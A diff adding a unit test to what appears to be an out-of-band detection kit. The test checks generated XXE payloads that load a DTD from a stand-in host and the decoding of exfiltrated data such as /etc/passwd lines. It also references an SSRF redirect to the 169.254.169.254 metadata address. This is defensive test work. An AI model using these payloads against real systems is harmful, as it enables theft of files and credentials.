@@ -166,3 +166,18 @@ test("stage: labels say what the edge sent, and a later hop is what proves follo
   assert.equal(stageOf({ answerCode: 302, answerTo: "169.254.169.254" }), "answered 302 → 169.254.169.254");
   assert.equal(stageOf({ summary: "GET / HTTP/1.1" }), null);
 });
+
+import { xxePayloads } from "../src/lib/kit.ts";
+import { xxeData } from "../src/lib/stage.ts";
+
+test("xxe: payloads load the DTD over HTTP with their code; the data hit decodes", () => {
+  const H = "abcdefghij0123456789klmnopqrstuvw.oob.example";
+  const ps = xxePayloads("x1", H);
+  assert.equal(ps[0].text, `<!DOCTYPE x SYSTEM "http://kx1.x1.${H}/x.dtd">`);
+  assert.equal(ps.find((p) => p.code === "kx7")!.text, `http://kx7.x1.${H}/feed.xml`);
+  assert.equal(variantOf({ extraLabels: ["kx0"] })!.name, "File data from the DTD");
+  assert.equal(stageOf({ answerPart: "x.dtd" }), "served x.dtd");
+  assert.equal(stageOf({ fullId: "kx0.x1.abc", summary: "GET /d?d=user%0A HTTP/1.1" }), "file data: user\\n");
+  assert.equal(xxeData({ fullId: "kx0.x1.abc", summary: "GET /d?d=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo= HTTP/1.1" }), "root:x:0:0:root:/root:/bin/bash\\n (base64, decoded)");
+  assert.equal(xxeData({ fullId: "kx1.x1.abc", summary: "GET /d?d=x HTTP/1.1" }), null, "only the DTD's own exfil hit");
+});
